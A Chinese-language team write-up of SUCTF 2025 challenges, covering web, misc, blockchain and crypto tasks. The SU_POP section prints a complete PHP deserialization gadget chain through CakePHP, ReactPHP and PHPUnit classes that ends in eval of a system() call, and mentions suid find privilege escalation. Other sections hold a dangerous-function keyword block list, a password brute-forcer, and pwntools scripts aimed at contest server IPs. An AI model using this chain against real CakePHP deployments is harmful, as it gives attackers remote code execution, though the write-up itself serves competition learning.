# SUCTF 2025 Writeup

> 原文: https://www.ctfiot.com/224263.html
> ID: 224263

本次 SUCTF 2025，我们XMCVE-Polaris战队排名第4。

排名
队伍
总分

1
S1uM4i
19019.72

2
Project Sekai
16815.5

3
_0xFFF_
14683.87

4
XMCVE-Polaris
12048.6

5
Arr3stY0u
11574.23

6
W&M
10994.47

7
Nepnep
10088.17

8
Spirit+
10068.86

9
Syclover
9109.17

10
灵盾信息
8144.36

使用ls查找oss

查看所有版本（这一步折磨了好久）

下载旧版本文件

得到flag

SU_POP

题目给了反序列化入口

也就是/ser?ser=base64

再就是分析链子 这种新链子 fix的时候 基本上都只是把链子的开头或者结尾改了 中间的过程是不会改的 所以我们可以去搜一下以前的cakephp的分析链子

https://xz.aliyun.com/t/9995?time__1311=n4%2BxnD0DuDRDcGiGCDyDBqOoWP0K5PDt1QYQhOe4D#toc-11

他这里给的入口点是位于: vendorsymfonyprocessProcess.php

__destruct方法中 貌似可以直接调用任意类的__call方法或者是调用含有close方法的类的close方法

“

但是很不幸 有个__wakeup方法限制 直接抛出异常了 不过不影响我们继续看链子

发现他是调用了__call方法 进入call 再到一个sink点 不过都是比较低的版本 sink点已经没了

很显然我们需要找开头和结尾

这里一些找链子的中间过程 十分曲折 我也就不说了 直接说正确的

开头是__destruct全局搜素

发现这里对reason变量进行拼接 且 可以控制 能触发tostring魔术方法

这里可以触发__call方法 因为我们stream可以控制

跟进call方法

这里存在任意类调用

这里提醒一点 由于我们前面调用__call方法是无参的 所以我们最后的sink点也要找个无参数的

最后找到了generate方法  这就是链子的全过程

但中间有几个参数要传递正确 直接给出exp

<?php
namespace ReactPromiseInternal;

use ReactPromisePromiseInterface;
use function ReactPromise_checkTypehint;
use function ReactPromiseresolve;
use function ReactPromiseset_rejection_handler;
use CakeHttpResponse;
class RejectedPromise{
    function set_rejection_handler(?callable $callback)
    {
        static $current = null;
        $previous = $current;
        $current = $callback;

        return $previous;
    }

    public function __construct()
    {

        $this->reason =new Response();
    }
    public function __destruct()
    {
        if ($this->handled) {
            return;
        }

        $handler = static::
set_rejection_handler(null);
        if ($handler === null) {
            $message = 'Unhandled promise rejection with ' . $this->reason;

            error_log($message);
            return;
        }

        try {
            $handler($this->reason);
        } catch (Throwable $e) {
            preg_match('/^([^:s]++)(.*+)$/sm', (string) $e, $match);
            assert(isset($match[1], $match[2]));
            $message = 'Fatal error: Uncaught ' . $match[1] . ' from unhandled promise rejection handler' . $match[2];

            error_log($message);
            exit(255);
        }
    }
}

namespace CakeHttp;

use CakeCoreConfigure;
use CakeHttpCookieCookieCollection;
use CakeHttpCookieCookieInterface;
use CakeHttpExceptionNotFoundException;
use DateTime;
use DateTimeInterface;
use DateTimeZone;
use InvalidArgumentException;
use LaminasDiactorosMessageTrait;
use LaminasDiactorosStream;
use PsrHttpMessageResponseInterface;
use PsrHttpMessageStreamInterface;
use SplFileInfo;
use Stringable;
use function CakeCoreenv;
use function CakeI18n__d;
use CakeORMTable;

class Response {
    public function __construct()
    {
        $this->stream =new Table();
    }
    public function __toString()
    {
        $this->stream->rewind();

        return $this->stream->getContents();
    }
}

namespace CakeORM;
use PHPUnitFrameworkMockObjectGeneratorMockClass;
use ArrayObject;
use BadMethodCallException;
use CakeCollectionCollectionInterface;
use CakeCoreApp;
use CakeCoreConfigure;
use CakeCoreExceptionCakeException;
use CakeDatabaseConnection;
use CakeDatabaseExceptionDatabaseException;
use CakeDatabaseExpressionQueryExpression;
use CakeDatabaseSchemaTableSchemaInterface;
use CakeDatabaseTypeFactory;
use CakeDatasourceConnectionManager;
use CakeDatasourceEntityInterface;
use CakeDatasourceExceptionInvalidPrimaryKeyException;
use CakeDatasourceRepositoryInterface;
use CakeDatasourceRulesAwareTrait;
use CakeEventEventDispatcherInterface;
use CakeEventEventDispatcherTrait;
use CakeEventEventListenerInterface;
use CakeEventEventManager;
use CakeORMAssociationBelongsTo;
use CakeORMAssociationBelongsToMany;
use CakeORMAssociationHasMany;
use CakeORMAssociationHasOne;
use CakeORMExceptionMissingEntityException;
use CakeORMExceptionPersistenceFailedException;
use CakeORMExceptionRolledbackTransactionException;
use CakeORMQueryDeleteQuery;
use CakeORMQueryInsertQuery;
use CakeORMQueryQueryFactory;
use CakeORMQuerySelectQuery;
use CakeORMQueryUpdateQuery;
use CakeORMRuleIsUnique;
use CakeUtilityInflector;
use CakeValidationValidatorAwareInterface;
use CakeValidationValidatorAwareTrait;
use Closure;
use Exception;
use InvalidArgumentException;
use PsrSimpleCacheCacheInterface;
use ReflectionFunction;
use ReflectionNamedType;
use function CakeCoredeprecationWarning;
use function CakeCorenamespaceSplit;
class Table
{

    public function __construct()
    {

        $this->_behaviors = new BehaviorRegistry();
    }

    public function __call(string $method, array $args)
    {

        //method=close arg=null
        var_dump($this->_behaviors);
        if ($this->_behaviors->hasMethod($method)) {
            return $this->_behaviors->call($method, $args);

        }
    }
}
class ObjectRegistry{}
class BehaviorRegistry extends ObjectRegistry{
    public function hasMethod(string $method): bool
    {
        $method = strtolower($method);

        return isset($this->_methodMap[$method]);
    }
    public function has(string $name): bool
    {
        return isset($this->_loaded[$name]);
    }
    public function __construct()
    {
        $this->_methodMap=["rewind"=>array("z","generate")];
        $this->_loaded=["z"=>new MockClass()];
    }

    public function call(string $method, array $args = [])
    {
        //method=close arg=null
        $method = strtolower($method);
        if ($this->hasMethod($method) && $this->has($this->_methodMap[$method][0])) {
            [$behavior, $callMethod] = $this->_methodMap[$method];

            return $this->_loaded[$behavior]->{$callMethod}(...$args);
        }
    }
}

namespace PHPUnitFrameworkMockObjectGenerator;

use function call_user_func;
use function class_exists;
use PHPUnitFrameworkMockObjectConfigurableMethod;
use function SymfonyComponentStrings;

final class MockClass
{
    public function __construct(){
        $this->classCode="system($_GET[1]);";
        $this->mockName="test";
    }
    public function generate()
    {
        if (!class_exists($this->mockName, false)) {
            eval($this->classCode);

            call_user_func(
                [
                    $this->mockName,
                    '__phpunit_initConfigurableMethods',
                ],
                ...$this->configurableMethods,
            );
        }

        return $this->mockName;
    }
}
namespace ReactPromiseInternal;
$a=new RejectedPromise();
echo base64_encode(serialize($a));

flag在根目录下 flag.txt

suid find提权

SU_photogallery

通过php -S开起的内置WEB服务器存在源码泄露漏洞，可以将PHP文件作为静态文件直接输出源码

具体参考这篇文章 https://www.cnblogs.com/Kawakaze777/p/17799235.html 读到的unzip.php的源码为

<?php
error_reporting(0);

function get_extension($filename){
    return pathinfo($filename, PATHINFO_EXTENSION);
}
function check_extension($filename,$path){
    $filePath = $path . DIRECTORY_SEPARATOR . $filename;
    if (is_file($filePath)) {
        $extension = strtolower(get_extension($filename));

        if (!in_array($extension, ['jpg', 'jpeg', 'png', 'gif'])) {
            if (!unlink($filePath)) {
                // echo "Fail to delete file: $filenamen";
                return false;
            }
            else{
                // echo "This file format is not supported:$extensionn";
                return false;
            }
        }
        else{
            return true;
        }
    }
    else{
        // echo "nofile";
        return false;
    }
}
function file_rename ($path,$file){
    $randomName = md5(uniqid().rand(0, 99999)) . '.' . get_extension($file);
    $oldPath = $path . DIRECTORY_SEPARATOR . $file;
    $newPath = $path . DIRECTORY_SEPARATOR . $randomName;

    if (!rename($oldPath, $newPath)) {
        unlink($path . DIRECTORY_SEPARATOR . $file);
        // echo "Fail to rename file: $filen";
        return false;
    }
    else{
        return true;
    }
}

function move_file($path,$basePath){
    foreach (glob($path . DIRECTORY_SEPARATOR . '*') as $file) {
        $destination = $basePath . DIRECTORY_SEPARATOR . basename($file);
        if (!rename($file, $destination)){
            // echo "Fail to rename file: $filen";
            return false;
        }
    }
    return true;
}

function check_base($fileContent){
    $keywords = ['eval', 'base64', 'shell_exec', 'system', 'passthru', 'assert', 'flag', 'exec', 'phar', 'xml', 'DOCTYPE', 'iconv', 'zip', 'file', 'chr', 'hex2bin', 'dir', 'function', 'pcntl_exec', 'array', 'include', 'require', 'call_user_func', 'getallheaders', 'get_defined_vars','info'];
    $base64_keywords = [];
    foreach ($keywords as $keyword) {
        $base64_keywords[] = base64_encode($keyword);
    }
    foreach ($base64_keywords as $base64_keyword) {
        if (strpos($fileContent, $base64_keyword)!== false) {
            return true;

        }
        else{
            return false;

        }
    }
}

function check_content($zip){
    for ($i = 0; $i < $zip->numFiles; $i++) {
        $fileInfo = $zip->statIndex($i);
        $fileName = $fileInfo['name'];
        if (preg_match('/..(/|.|%2e%2e%2f)/i', $fileName)) {
            return false;
        }
        // echo "Checking file: $fileNamen";
        $fileContent = $zip->getFromName($fileName);

        if (preg_match('/(eval|base64|shell_exec|system|passthru|assert|flag|exec|phar|xml|DOCTYPE|iconv|zip|file|chr|hex2bin|dir|function|pcntl_exec|array|include|require|call_user_func|getallheaders|get_defined_vars|info)/i', $fileContent) || check_base($fileContent)) {
            // echo "Don't hack me!n";                return false;
        }
        else {
            continue;
        }
    }
    return true;
}

function unzip($zipname, $basePath) {
    $zip = new ZipArchive;

    if (!file_exists($zipname)) {
        // echo "Zip file does not exist";
        return "zip_not_found";
    }
    if (!$zip->open($zipname)) {
        // echo "Fail to open zip file";
        return "zip_open_failed";
    }
    if (!check_content($zip)) {
        return "malicious_content_detected";
    }
    $randomDir = 'tmp_'.md5(uniqid().rand(0, 99999));
    $path = $basePath . DIRECTORY_SEPARATOR . $randomDir;
    if (!mkdir($path, 0777, true)) {
        // echo "Fail to create directory";
        $zip->close();
        return "mkdir_failed";
    }
    if (!$zip->extractTo($path)) {
        // echo "Fail to extract zip file";
        $zip->close();
    }
    for ($i = 0; $i < $zip->numFiles; $i++) {
        $fileInfo = $zip->statIndex($i);
        $fileName = $fileInfo['name'];
        if (!check_extension($fileName, $path)) {
            // echo "Unsupported file extension";
            continue;
        }
        if (!file_rename($path, $fileName)) {
            // echo "File rename failed";
            continue;
        }
    }
    if (!move_file($path, $basePath)) {
        $zip->close();
        // echo "Fail to move file";
        return "move_failed";
    }
    rmdir($path);
    $zip->close();
    return true;
}

$uploadDir = DIR . DIRECTORY_SEPARATOR . 'upload/suimages/';
if (!is_dir($uploadDir)) {
    mkdir($uploadDir, 0777, true);
}

if (isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK) {
    $uploadedFile = $_FILES['file'];
    $zipname = $uploadedFile['tmp_name'];
    $path = $uploadDir;

    $result = unzip($zipname, $path);
    if ($result === true) {
        header("Location: index.html?status=success");
        exit();
    } else {
        header("Location: index.html?status=$result");
        exit();
    }
} else {
    header("Location: index.html?status=file_error");
    exit();
}

代码挺多 可以让ai分析一下

使用使用 unzip 函数处理压缩包

使用 check_extension() 确保只允许图片文件（jpg、jpeg、png、gif）解压。不支持的文件会直接删除。

使用 check_base() 检查文件内容是否包含恶意关键字的 Base64 编码版本。在 check_content() 中，通过正则表达式检查文件内容是否包含恶意关键字（如 eval、shell_exec、exec 等）。

使用正则表达式匹配路径

解压的文件会通过 MD5 随机重命名，避免覆盖已存在文件，同时防止上传的恶意脚本直接被访问。

Misc

SU_Checkin

发现部分密码SePassWordLen23SUCT

这里也有个提示密码长度为23 上面的有19个 再加个F 因为SUCTF 所以只剩下三个需要爆破

在看流量包 http跟踪50

发现密文

发现hint 然后去搜发现是一种加密方式

然后找到这篇文章https://blog.csdn.net/LYambition/article/details/106000082

Jasypt这个库可以直接解密 然后密码就是刚刚上面说的爆破三位 让gpt写个脚本

package com.example;

import org.jasypt.encryption.pbe.StandardPBEStringEncryptor;
import org.jasypt.encryption.pbe.config.EnvironmentStringPBEConfig;

/**
 * 把密文放到配置文件中的时候要注意：
 * ENC(密文)
 * @author LeeYoung
 */
public class Main {

    private static final String basePassword = "SePassWordLen23SUCTF"; // 基础口令
    private static final String algorithm = "PBEWithMD5AndDES";
    private static final String ciphertext = "ElV+bGCnJYHVR8m23GLhprTGY0gHi/tNXBkGBtQusB/zs0uIHHoXMJoYd6oSOoKuFWmAHYrxkbg=";

    public static void main(String[] args) {
        try {
            // 尝试所有可能的三位字符组合
            for (char c1 : getCharacterSet()) {
                for (char c2 : getCharacterSet()) {
                    for (char c3 : getCharacterSet()) {
                        tryCombination(basePassword + c1 + c2 + c3);
                    }
                }
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static char[] getCharacterSet() {
        return "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".toCharArray();
    }

    private static void tryCombination(String password) {
        StandardPBEStringEncryptor encryptor = new StandardPBEStringEncryptor();
        EnvironmentStringPBEConfig config = new EnvironmentStringPBEConfig();
        config.setAlgorithm(algorithm);
        config.setPassword(password);
        encryptor.setConfig(config);

        try {
            String plaintext = encryptor.decrypt(ciphertext);
            System.out.println("Possible password found: " + password);
            System.out.println("Decrypted text: " + plaintext);
            // 如果找到了正确的密码，可以选择在此处退出循环或继续查找其他可能的密码
        } catch (Exception e) {
            // 忽略错误，继续尝试下一个组合
        }
    }
}

爆破得到密码和flag

Onchain Magician

代码如下：

pragma solidity 0.8.28;

contract MagicBox {
 struct Signature {
 uint8 v;
 bytes32 r;
 bytes32 s;
 }

 address magician;
 bytes32 alreadyUsedSignatureHash;
 bool isOpened;

 constructor() {}

 function isSolved() public view returns (bool) {
 return isOpened;
 }

 function getMessageHash(address _magician) public view returns (bytes32) {
 return keccak256(abi.encodePacked("I want to open the magic box", _magician, address(this), block.chainid));
 }

 function _getSignerAndSignatureHash(Signature memory _signature) internal view returns (address, bytes32) {
 address signer = ecrecover(getMessageHash(msg.sender), _signature.v, _signature.r, _signature.s);
 bytes32 signatureHash = keccak256(abi.encodePacked(_signature.v, _signature.r, _signature.s));
 return (signer, signatureHash);
 }

 function signIn(Signature memory signature) external {
 require(magician == address(0), "Magician already signed in");
 (address signer, bytes32 signatureHash) = _getSignerAndSignatureHash(signature);
 require(signer == msg.sender, "Invalid signature");
 magician = signer;
 alreadyUsedSignatureHash = signatureHash;
 }

 function openBox(Signature memory signature) external {
 require(magician == msg.sender, "Only magician can open the box");
 (address signer, bytes32 signatureHash) = _getSignerAndSignatureHash(signature);
 require(signer == msg.sender, "Invalid signature");
 require(signatureHash != alreadyUsedSignatureHash, "Signature already used");
 isOpened = true;
 }
}

题目很简单，就是要对一个 hash 签名，送进去两个完全不同的签名就行。

遂找个脚本，两次签名即可，如下

sign.py

import libnum
from secp256k1.secp256k1 import *
sk = 0x6072ca68028ec1282998de7ab5e4b7332efdc042f2dd95feb50392fdb6ea5337
Mhash = 0x46055d035781987375fcdba2ac4180c3658fd4e969b4f390bb2ed411084eb4c5
sk = libnum.n2s(sk)
Mhash = libnum.n2s(Mhash)
sign = ecdsa_raw_sign(Mhash, sk)
v, r, s = sign
v = hex(v)
r = hex(r)
s = hex(s)
print(f'{v = }')
print(f'{r = }')
print(f'{s = }')

# 验证签名，失败返回false
tmp = ecdsa_raw_recover(msghash=Mhash, vrs=sign)
print(tmp)

secp256k1.py

import hashlib, hmac
import sys
if sys.version[0] == '2':
    safe_ord = ord
else:
    safe_ord = lambda x: x

# Elliptic curve parameters (secp256k1)

P = 2**256 - 2**32 - 977
N = 115792089237316195423570985008687907852837564279074904382605163141518161494337
A = 0
B = 7
Gx = 55066263022277343669578718895168534326250603453777594175500187360389116729240
Gy = 32670510020758816978083085130507043184471273380659243275938904335757337482424
G = (Gx, Gy)

def bytes_to_int(x):
    o = 0
    for b in x:
        o = (o << 8) + safe_ord(b)
    return o

# Extended Euclidean Algorithm
def inv(a, n):
    if a == 0:
        return 0
    lm, hm = 1, 0
    low, high = a % n, n
    while low > 1:
        r = high//low
        nm, new = hm-lm*r, high-low*r
        lm, low, hm, high = nm, new, lm, low
    return lm % n

def to_jacobian(p):
    o = (p[0], p[1], 1)
    return o

def jacobian_double(p):
    if not p[1]:
        return (0, 0, 0)
    ysq = (p[1] ** 2) % P
    S = (4 * p[0] * ysq) % P
    M = (3 * p[0] ** 2 + A * p[2] ** 4) % P
    nx = (M**2 - 2 * S) % P
    ny = (M * (S - nx) - 8 * ysq ** 2) % P
    nz = (2 * p[1] * p[2]) % P
    return (nx, ny, nz)

def jacobian_add(p, q):
    if not p[1]:
        return q
    if not q[1]:
        return p
    U1 = (p[0] * q[2] ** 2) % P
    U2 = (q[0] * p[2] ** 2) % P
    S1 = (p[1] * q[2] ** 3) % P
    S2 = (q[1] * p[2] ** 3) % P
    if U1 == U2:
        if S1 != S2:
            return (0, 0, 1)
        return jacobian_double(p)
    H = U2 - U1
    R = S2 - S1
    H2 = (H * H) % P
    H3 = (H * H2) % P
    U1H2 = (U1 * H2) % P
    nx = (R ** 2 - H3 - 2 * U1H2) % P
    ny = (R * (U1H2 - nx) - S1 * H3) % P
    nz = (H * p[2] * q[2]) % P
    return (nx, ny, nz)

def from_jacobian(p):
    z = inv(p[2], P)
    return ((p[0] * z**2) % P, (p[1] * z**3) % P)

def jacobian_multiply(a, n):
    if a[1] == 0 or n == 0:
        return (0, 0, 1)
    if n == 1:
        return a
    if n < 0 or n >= N:
        return jacobian_multiply(a, n % N)
    if (n % 2) == 0:
        return jacobian_double(jacobian_multiply(a, n//2))
    if (n % 2) == 1:
        return jacobian_add(jacobian_double(jacobian_multiply(a, n//2)), a)

def multiply(a, n):
    return from_jacobian(jacobian_multiply(to_jacobian(a), n))

def add(a, b):
    return from_jacobian(jacobian_add(to_jacobian(a), to_jacobian(b)))

def privtopub(privkey):
    return multiply(G, bytes_to_int(privkey))

def deterministic_generate_k(msghash, priv):
    # v = b'x01' * 32
    # k = b'x00' * 32
    v = b'x12' * 32
    k = b'x23' * 32
    k = hmac.new(k, v+b'x00'+priv+msghash, hashlib.sha256).digest()
    v = hmac.new(k, v, hashlib.sha256).digest()
    k = hmac.new(k, v+b'x01'+priv+msghash, hashlib.sha256).digest()
    v = hmac.new(k, v, hashlib.sha256).digest()
    return bytes_to_int(hmac.new(k, v, hashlib.sha256).digest())

# bytes32, bytes32 -> v, r, s (as numbers)
def ecdsa_raw_sign(msghash, priv):

    z = bytes_to_int(msghash)
    k = deterministic_generate_k(msghash, priv)

    r, y = multiply(G, k)
    s = inv(k, N) * (z + r*bytes_to_int(priv)) % N

    v, r, s = 27+((y % 2) ^ (0 if s * 2 < N else 1)), r, s if s * 2 < N else N - s
    return v, r, s

def ecdsa_raw_recover(msghash, vrs):
    v, r, s = vrs
    if not (27 <= v <= 34):
        raise ValueError("%d must in range 27-31" % v)
    x = r
    xcubedaxb = (x*x*x+A*x+B) % P
    beta = pow(xcubedaxb, (P+1)//4, P)
    y = beta if v % 2 ^ beta % 2 else (P - beta)
    # If xcubedaxb is not a quadratic residue, then r cannot be the x coord
    # for a point on the curve, and so the sig is invalid
    if (xcubedaxb - y*y) % P != 0 or not (r % N) or not (s % N):
        return False
    z = bytes_to_int(msghash)
    Gz = jacobian_multiply((Gx, Gy, 1), (N - z) % N)
    XY = jacobian_multiply((x, y, 1), s)
    Qr = jacobian_add(Gz, XY)
    Q = jacobian_multiply(Qr, inv(r, N))
    Q = from_jacobian(Q)

    return Q

Onchain Checkin

1.设置程序ID为SUCTF2Q25DnchainCheckin11111111111111111111，调用checkin方法

2.将account3的key给flag3,然后在日志中输出flag1，返回成功结果。

3.使用在线网站查询记录，使用ID进行搜索

4.查看日志发现base编码的结果得到解码得到第一部分flag，第二部分为YouHaveFound

1.问卷提打开就有flag

Crypto

SU_signin

参考 https://magicfrank00.github.io/writeups/writeups/alpacahack2024/a-dance-of-add-and-mul/ ，将阶数改小，利用isogeny恢复flag

# https://magicfrank00.github.io/writeups/writeups/alpacahack2024/a-dance-of-add-and-mul/
import libnum
p = 0x1a0111ea397fe69a4b1ba7b6434bacd764774b84f38512bf6730d2a0f6b0f6241eabfffeb153ffffb9feffffffffaaab
K = GF(p)
E = EllipticCurve(K, (0, 4))
o = 793479390729215512516507951283169066088130679960393952059283337873017453583023682367384822284289
n1, n2 = 859267, 52437899
E.random_element()
cs = ...
flag = ''
tmp = 923437523760618658131300225986997133705973440106967859884393719150179692206291737454580267
n1, n2 = 859267, 52437899
r = o//(10177)

    
tt = '2558028070049345735599966692238165043970552021669288124924862764282615075181952619645122358179074609427643871393283'
flag = ''

for c in cs:
    c = E(c) * r
    tmp = str(E.isogeny(c))
    if tt in str(tmp):
        flag += '0'
    else:
        flag += '1'
    if len(flag)%8==0:
        m = int(flag,2)
        m = libnum.n2s(m)
        print(m)
# SUCTF{We1come__T0__SUCTF__2025}

SU_mathgame

game1，生成伪素数即可（参考crypto-attacks-pseudoprimes）

import os
import sys
from unittest import TestCase

path = os.path.dirname(os.path.dirname(os.path.realpath(os.path.abspath(__file__))))
if sys.path[1] != path:
    sys.path.insert(1, path)

from attacks.pseudoprimes import miller_rabin

class Pseudoprimes(TestCase):
    def _miller_rabin(self, n, bases):
        assert n > 3
        r = 0
        d = n - 1
        while d % 2 == 0:
            r += 1
            d //= 2

        for a in bases:
            x = pow(a, d, n)
            if x == 1 or x == n - 1:
                continue
            for _ in range(r - 1):
                x = pow(x, 2, n)
                if x == n - 1:
                    break
            else:
                return False
        return True

    def test_miller_rabin(self):
        bases = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31]
        n, p1, p2, p3 = miller_rabin.generate_pseudoprime(bases, min_bit_length=400)
        self.assertIsInstance(n, int)
        self.assertIsInstance(p1, int)
        self.assertIsInstance(p2, int)
        self.assertIsInstance(p3, int)
        self.assertGreaterEqual(n.bit_length(), 400)
        self.assertEqual(n, p1 * p2 * p3)
        self.assertTrue(self._miller_rabin(n, bases))

        bases = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61]
        n, p1, p2, p3 = miller_rabin.generate_pseudoprime(bases, min_bit_length=600)
        self.assertIsInstance(n, int)
        self.assertIsInstance(p1, int)
        self.assertIsInstance(p2, int)
        self.assertIsInstance(p3, int)
        self.assertGreaterEqual(n.bit_length(), 600)
        self.assertEqual(n, p1 * p2 * p3)
        self.assertTrue(self._miller_rabin(n, bases))

gam2, 经典问题，参考https://tover.xyz/p/cubic/

# sage
def solve(n, N=1, check=True):  # count N groups
  R.<x, y, z> = QQ[]
  f = x^3+y^3+z^3-(n-1)*x^2*(y+z)-(n-1)*y^2*(x+z)-(n-1)*z^2*(x+y)-(2*n-3)*x*y*z
  tran = EllipticCurve_from_cubic(f, None, true)
  tran_inv = tran.inverse()
  EC = tran.codomain()
  g = EC.gens()[0]
  P = g

  count = 0
  while count<3:
    Pinv = tran_inv(P)
    _x = Pinv[0].numerator()
    _y = Pinv[1].numerator()
    _z = Pinv[0].denominator()
    if _x>0 and _y>0:
      print('x = %d' % _x)
      print('y = %d' % _y)
      print('z = %d' % _z)
      if check: print('check: '+str(f([_x, _y, _z])==0))
      print('')
      count = count+1
    P = P+g

solve(4)

game3, 注意到set_random_seed(int(time.time())), 故有了种子，之后所有参数都是有的。ans直接给个C(Trans(kx))

最后，交互代码如下：

from pwn import *
import hashlib
from itertools import *
from string import *
# context.log_level = 'debug'

# import socketserver
# import signal
from Crypto.Util.number import *
from random import randint
import time
from sage.geometry.hyperbolic_space.hyperbolic_isometry import moebius_transform
# from secret import flag

def nc(data):
    if ':' in data:
        sym = ':'
    else:
        sym = ' '
    address = data.split(sym)[-2]
    port = int(data.split(sym)[-1].strip())
    print('地址:', address)
    print('端口:', port)
    sh = remote(address, port)
    return sh

# 直接粘贴题目给的靶机地址、端口
data = 'nc 1.95.46.185 10001'
sh = nc(data)

"""在下面开始编程，与服务器进行交互"""
g1 = 1039060312974897338070170130946226525072449352944784385585541004615179695645225157
sh.recvuntil(b'[+] Plz Tell Me your number: ')
sh.sendline(str(g1).encode())
x = 1440354387400113353318275132419054375891245413681864837390427511212805748408072838847944629793120889446685643108530381465382074956451566809039119353657601240377236701038904980199109550001860607309184336719930229935342817546146083848277758428344831968440238907935894338978800768226766379
y = 1054210182683112310528012408530531909717229064191793536540847847817849001214642792626066010344383473173101972948978951703027097154519698536728956323881063669558925110120619283730835864056709609662983759100063333396875182094245046315497525532634764115913236450532733839386139526489824351
z = 9391500403903773267688655787670246245493629218171544262747638036518222364768797479813561509116827252710188014736501391120827705790025300419608858224262849244058466770043809014864245428958116544162335497194996709759345801074510016208346248254582570123358164225821298549533282498545808644

g2 = f'{x},{y},{z}'.encode()
print(g2)
sh.recvuntil(b'[+] Plz give Me your a, b, c:')
sh.sendline(g2)

print(int(time.time()))

set_random_seed(int(time.time()))
C = ComplexField(999)
M = random_matrix(CC, 2, 2)
Trans = lambda z: moebius_transform(M, z)

out = []
for _ in range(3):
    x = C.random_element()
    out.append((x,Trans(x)))

kx = C.random_element()
print('kx =', kx)
C2 = ComplexField(50)

ans = C(Trans(kx))
# print(C2(ans))
# print(C2(Trans(kx)))

sh.recvuntil(b'Plz Tell Me your answer:')
sh.sendline(str(ans).encode())
sh.recvline()
sh.recvline()
sh.recvline()
sh.interactive()
# SUCTF{Hope_Y0u_have_a_NICE_tr1p_in_SUCTF~}

SU_hash

参考DownUnderCTF 2023 Writeups | 廢文集中區。其中，哈希碰撞部分利用格规约得以实现。

from Crypto.Util.number import *
from random import getrandbits
from hashlib import md5 as md5
import subprocess
from tempfile import TemporaryDirectory
import os, pickle
from tqdm import trange
from sage.all import *
from binteger import Bin
from pwn import *
import hashlib
from itertools import *
from string import *
context.log_level = 'debug'

class myhash:
        def __init__(self, n):
            self.g = 91289086035117540959154051117940771730039965839291520308840839624996039016929
            self.n = n

        def update(self, msg: bytes):
            for i in range(len(msg)):
                self.n = self.g * (2 * self.n + msg[i])
                self.n = self.n & ((1 << 383) - 1)

        def digest(self) -> bytes:
            return int((self.n - 0xd1ef3ad53f187cc5488d19045) % (1 << 128)).to_bytes(16, "big")
        
def xor(x, y):
    x = b'x00' * (16 - len(x)) + x
    y = b'x00' * (16 - len(y)) + y
    return long_to_bytes(bytes_to_long(bytes([a ^^ b for a, b in zip(x, y)])))

def fn(msg, n0):
    h = myhash(n0)
    ret = bytes([0] * 16)
    for b in msg:
        h.update(bytes([b]))
        d = h.digest()
        ret = xor(ret, d)
    return ret

def attack_hash(n0:
int, var_len:
int, Hash:
bytes): # 给定n0, 字符串长度，目标Hash值，反求出消息
    xs = [var(f"x{i+1}") for i in range(var_len)]
    ms = [xs[i] + 128 for i in range(var_len)]
    g = 91289086035117540959154051117940771730039965839291520308840839624996039016929
    a = 0xd1ef3ad53f187cc5488d19045
    n = n0
    for i in range(var_len):
        n = g*(2*n + ms[i])

    coff_list= [pow(2,128)]
    tmp_equ = str(n).split(' + ')
    for i in range(var_len):
        for each in tmp_equ:
            if f'x{i+1}' in each:
                tmp = int(each.split('*')[0]) % pow(2, 128)
                coff_list.append(tmp)
                break

    coff_list.append(int(tmp_equ[-1]))

    D = bytes_to_long(Hash) # 目标哈希
    coff_list[-1] = coff_list[-1]-a-D

    M = matrix(var_len+2,var_len+2)
    for i in range(var_len+2):
        M[i, 0] = coff_list[i]
        if i>=1:
            M[i, i] = 1

    M = M.LLL()
    for line in M:
        if line[0] == 0 and line[-1]==1:
            ans = [i+128 for i in line[1:-1]]
            return bytes(ans)
    return None

# 以相同hash摘要为目标的碰撞
def fastcoll(n0, prefix=b""):  # 给定前缀下（可空），碰撞出两个有相同hash的不同消息
    if prefix:
        h = myhash(n0)
        h.update(prefix)
        n0 = h.n  # 更新n0
    i = 40
    ms = []
    tmphash = long_to_bytes(getrandbits(128))
    while len(ms) <2:
        tmp = attack_hash(n0, var_len=i, Hash=tmphash)
        if tmp:
            ms.append(tmp)
        i += 1
    return ms

def myhexdigest(n0, msg):
    h = myhash(n0)
    for b in msg:
        h.update(bytes([b]))
        d = h.digest()
    return d.hex()

def byt2bv(b, n):
    return vector(GF(2), Bin(b, n=n).list)

def bv2byt(b):
    return Bin(b).bytes

def nc(data):
    if ':' in data:
        sym = ':'
    else:
        sym = ' '
    address = data.split(sym)[-2]
    port = int(data.split(sym)[-1].strip())
    print('地址:', address)
    print('端口:', port)
    sh = remote(address, port)
    return sh

# Proof of Work
def PoW(sh):
    proof = sh.recvline_contains(b'XXXX').decode().split('sha256')[-1]  # 接收数据sha256相关数据
    Xnum = proof.split('+')[0].upper().count("X")
    tail = proof.split('+')[1].split(')')[0].strip()
    _hash = proof.split('==')[-1].strip()
    print(proof)
    sh.recvuntil(b'XXXX')  # 接收待输入指令
    if 'n' in _hash:
        _hash = _hash.split('n')[0]
    print("未知数：", Xnum)
    print(tail)
    print(_hash)
    print('开始爆破！')
    table = ascii_letters + digits  # 爆破字符表
    for i in product(table, repeat=Xnum):
        head = ''.join(i)
        t = hashlib.sha256((head + tail).encode()).hexdigest()
        if t == _hash:
            print('爆破成功！结果是：', end='')
            print(head)
            sh.sendline(head.encode())
            return head

# 直接粘贴题目给的靶机地址、端口
data = 'nc 1.95.46.185 10007'
sh = nc(data)
"""在下面开始编程，与服务器进行交互"""
PoW(sh)
test_n0 = int(sh.recvline_contains(b'n0 = ').split(b' = ')[-1])
print('test_n0 =', test_n0)

ms = []
xs = []
prev = b""
for _ in range(129):
    print(len(prev))
    ma, mb = fastcoll(n0=test_n0, prefix=prev)
    ms.append((ma, mb))
    x = xor(fn(prev + ma, test_n0), fn(prev + mb, test_n0))
    xs.append(x)
    prev += ma

print('done')

cur = byt2bv(fn(b"".join([ma for ma, mb in ms]), test_n0), 128)
mat = matrix(GF(2), [byt2bv(x, 128) for x in xs])
print(mat.rank())
# assert mat.rank() == 128
target = byt2bv(b'justjusthashhash', 128)
# cur+?*mat=target
sol = mat.solve_left(target - cur)
print(sol)
msg = b""
for v, ma, mb in zip(sol, *zip(*ms)):
    if v == 0:
        msg += ma
    else:
        msg += mb

msg = msg.hex()
print('find msg')

# 服务器端n固定，直接提交msg即可
data = 'nc 1.95.46.185 10007'
sh = nc(data)
"""在下面开始编程，与服务器进行交互"""
PoW(sh)
